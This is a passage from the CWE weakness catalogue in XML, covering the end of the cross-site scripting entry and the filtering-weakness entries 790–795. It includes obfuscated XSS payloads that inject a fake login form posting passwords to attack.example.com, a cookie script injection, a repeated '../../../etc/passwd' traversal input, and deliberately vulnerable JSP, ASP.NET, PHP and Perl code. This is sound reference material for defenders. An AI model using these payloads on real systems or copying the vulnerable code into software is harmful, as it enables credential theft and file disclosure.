                     <xhtml:br/>&lt;/div&gt;&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22<xhtml:br/>stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input<xhtml:br/>%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php<xhtml:br/>%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text<xhtml:br/>%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A<xhtml:br/>+%3Cinput+type%3D%22password%22+name%3D%22password%22<xhtml:br/>+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22<xhtml:br/>+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</xhtml:div>
               </Example_Code>
               <Body_Text>The same attack string could also be obfuscated as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript"&gt;<xhtml:br/>document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073<xhtml:br/>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064<xhtml:br/>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067<xhtml:br/>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D<xhtml:br/>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063<xhtml:br/>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F<xhtml:br/>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D<xhtml:br/>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061<xhtml:br/>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068<xhtml:br/>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070<xhtml:br/>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D<xhtml:br/>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079<xhtml:br/>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061<xhtml:br/>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065<xhtml:br/>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073<xhtml:br/>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075<xhtml:br/>\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073<xhtml:br/>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022<xhtml:br/>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E<xhtml:br/>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D<xhtml:br/>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C<xhtml:br/>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F<xhtml:br/>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example also displays a Reflected XSS (Type 1) scenario.</Intro_Text>
               <Body_Text>The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.</Body_Text>
               <Example_Code Nature="bad" Language="JSP">
                  <xhtml:div>&lt;% String eid = request.getParameter("eid"); %&gt;<xhtml:br/>...<xhtml:br/>Employee ID: &lt;%= eid %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>&lt;%<xhtml:br/>protected System.Web.UI.WebControls.TextBox Login;<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeID;<xhtml:br/>...<xhtml:br/>EmployeeID.Text = Login.Text;<xhtml:br/>%&gt;<xhtml:br/>
                     <xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeID" runat="server" /&gt;&lt;/p&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example covers a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.</Body_Text>
               <Example_Code Nature="bad" Language="JSP">
                  <xhtml:div>&lt;%Statement stmt = conn.createStatement();<xhtml:br/>ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);<xhtml:br/>if (rs != null) {<xhtml:div style="margin-left:10px;">rs.next();<xhtml:br/>String name = rs.getString("name");</xhtml:div>}%&gt;<xhtml:br/>
                     <xhtml:br/>Employee Name: &lt;%= name %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>&lt;%<xhtml:br/>protected System.Web.UI.WebControls.Label EmployeeName;<xhtml:br/>...<xhtml:br/>string query = "select * from emp where id=" + eid;<xhtml:br/>sda = new SqlDataAdapter(query, conn);<xhtml:br/>sda.Fill(dt);<xhtml:br/>string name = dt.Rows[0]["Name"];<xhtml:br/>...<xhtml:br/>EmployeeName.Text = name;%&gt;<xhtml:br/>&lt;p&gt;&lt;asp:label id="EmployeeName" runat="server" /&gt;&lt;/p&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.</Intro_Text>
               <Body_Text>CreateUser.php</Body_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$username = mysql_real_escape_string($username);<xhtml:br/>$fullName = mysql_real_escape_string($fullName);<xhtml:br/>$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;<xhtml:br/>mysql_query($query);<xhtml:br/>/.../</xhtml:div>
               </Example_Code>
               <Body_Text>The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:</Body_Text>
               <Body_Text>ListUsers.php</Body_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$query = 'Select * From users Where loggedIn=true';<xhtml:br/>$results = mysql_query($query);<xhtml:br/>
                     <xhtml:br/>if (!$results) {<xhtml:div style="margin-left:10px;">exit;</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>//Print list of users to page</xhtml:i>
                     <xhtml:br/>echo '&lt;div id="userlist"&gt;Currently Active Users:';<xhtml:br/>while ($row = mysql_fetch_assoc($results)) {<xhtml:div style="margin-left:10px;">echo '&lt;div class="userNames"&gt;'.$row['fullname'].'&lt;/div&gt;';</xhtml:div>}<xhtml:br/>echo '&lt;/div&gt;';</xhtml:div>
               </Example_Code>
               <Body_Text>The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Consider an application that provides a simplistic message board that saves messages in HTML format and appends them to a file.  When a new user arrives in the room, it makes an announcement:</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$name = $_COOKIE["myname"];<xhtml:br/>$announceStr = "$name just logged in.";<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>//save HTML-formatted message to file; implementation details are irrelevant for this example.</xhtml:i>
                     <xhtml:br/>
				saveMessage($announceStr);</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>&lt;script&gt;document.alert('Hacked');&lt;/script&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The raw contents of the message file would look like:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>&lt;script&gt;document.alert('Hacked');&lt;/script&gt; has logged in.</xhtml:div>
               </Example_Code>
               <Body_Text>For each person who visits the message page, their browser would execute the script, generating a pop-up window that says "Hacked". More malicious attacks are possible; see the rest of this entry.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2014-8958</Reference>
               <Description>Admin GUI allows XSS through cookie.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8958</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-9764</Reference>
               <Description>Web stats program allows XSS through crafted HTTP header.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9764</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2014-5198</Reference>
               <Description>Web log analysis product allows XSS through crafted HTTP Referer header.</Description>
               <Link>http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5198</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5080</Reference>
               <Description>Chain: protection mechanism failure allows XSS</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5080</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4308</Reference>
               <Description>Chain: incomplete blacklist (CWE-184) only checks "javascript:" tag, allowing XSS (CWE-79) using other tags</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4308</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5727</Reference>
               <Description>Chain: incomplete blacklist (CWE-184) only removes SCRIPT tags, enabling XSS (CWE-79)</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5727</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5770</Reference>
               <Description>Reflected XSS using the PATH_INFO in a URL</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5770</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4730</Reference>
               <Description>Reflected XSS not properly handled when generating an error message</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5734</Reference>
               <Description>Reflected XSS sent through email message.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5734</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0971</Reference>
               <Description>Stored XSS in a security product.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0971</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5249</Reference>
               <Description>Stored XSS using a wiki page.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5249</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3568</Reference>
               <Description>Stored XSS in a guestbook application.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3568</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3211</Reference>
               <Description>Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3211</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3295</Reference>
               <Description>Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS (CWE-79).</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3295</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Cross-site scripting (XSS)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Cross-site Scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Cross-site scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Cross Site Scripting (XSS)</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A4</Entry_ID>
               <Entry_Name>Cross-Site Scripting (XSS) Flaws</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>8</Entry_ID>
               <Entry_Name>Cross-site Scripting</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-79</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="209"/>
            <Related_Attack_Pattern CAPEC_ID="588"/>
            <Related_Attack_Pattern CAPEC_ID="591"/>
            <Related_Attack_Pattern CAPEC_ID="592"/>
            <Related_Attack_Pattern CAPEC_ID="63"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-709"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and Response Splitting).&#34; Page 31"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 3: Web-Client Related Vulnerabilities (XSS).&#34; Page 63"/>
            <Reference External_Reference_ID="REF-712"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 13, &#34;Web-Specific Input Issues&#34; Page 413"/>
            <Reference External_Reference_ID="REF-714"/>
            <Reference External_Reference_ID="REF-715"/>
            <Reference External_Reference_ID="REF-716"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-718"/>
            <Reference External_Reference_ID="REF-719"/>
            <Reference External_Reference_ID="REF-720"/>
            <Reference External_Reference_ID="REF-721"/>
            <Reference External_Reference_ID="REF-722"/>
            <Reference External_Reference_ID="REF-723"/>
            <Reference External_Reference_ID="REF-724"/>
            <Reference External_Reference_ID="REF-725"/>
            <Reference External_Reference_ID="REF-726"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 17, &#34;Cross Site Scripting&#34;, Page 1071"/>
            <Reference External_Reference_ID="REF-956"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-79"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
            </Note>
            <Note Type="Applicable Platform">
               <xhtml:p>XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.</xhtml:p>
            </Note>
         </Notes>
         
      </Weakness>
      <Weakness ID="790" Name="Improper Filtering of Special Elements" Abstraction="Class" Structure="Simple" Status="Incomplete">
         <Description>The software receives data from an upstream component, but does not filter or incorrectly filters special elements before sending it to a downstream component.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="138" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="138" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         
      </Weakness>
      <Weakness ID="791" Name="Incomplete Filtering of Special Elements" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software receives data from an upstream component, but does not completely filter special elements before sending it to a downstream component.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="790" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="790" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         
      </Weakness>
      <Weakness ID="792" Name="Incomplete Filtering of One or More Instances of Special Elements" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software receives data from an upstream component, but does not completely filter one or more instances of special elements before sending it to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Incomplete filtering of this nature involves either:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>only filtering a single instance of a special element when more exist, or</xhtml:li>
                  <xhtml:li>not filtering all instances or all elements where multiple special elements exist.</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="791" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="791" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         
      </Weakness>
      <Weakness ID="793" Name="Only Filtering One Instance of a Special Element" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software receives data from an upstream component, but only filters a single instance of a special element before sending it to a downstream component.</Description>
         <Extended_Description>Incomplete filtering of this nature may be location-dependent, as in only the first or last element is filtered.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="792" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="792" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         
      </Weakness>
      <Weakness ID="794" Name="Incomplete Filtering of Multiple Instances of Special Elements" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software receives data from an upstream component, but does not filter all instances of a special element before sending it to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>Incomplete filtering of this nature may be applied to:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>sequential elements (special elements that appear next to each other) or</xhtml:li>
                  <xhtml:li>non-sequential elements (special elements that appear multiple times in different locations).</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="792" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="792" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         
      </Weakness>
      <Weakness ID="795" Name="Only Filtering Special Elements at a Specified Location" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software receives data from an upstream component, but only accounts for special elements at a specified location, thereby missing remaining special elements that may exist before sending it to a downstream component.</Description>
         <Extended_Description>
            <xhtml:p>A filter might only account for instances of special elements when they occur:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:ul>
                  <xhtml:li>relative to a marker (e.g. "at the beginning/end of string; the second argument"), or</xhtml:li>
                  <xhtml:li>at an absolute position (e.g. "byte number 10").</xhtml:li>
               </xhtml:ul>
            </xhtml:div>
            <xhtml:p>This may leave special elements in the data that did not match the filter position, but still may be dangerous.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="791" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="791" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
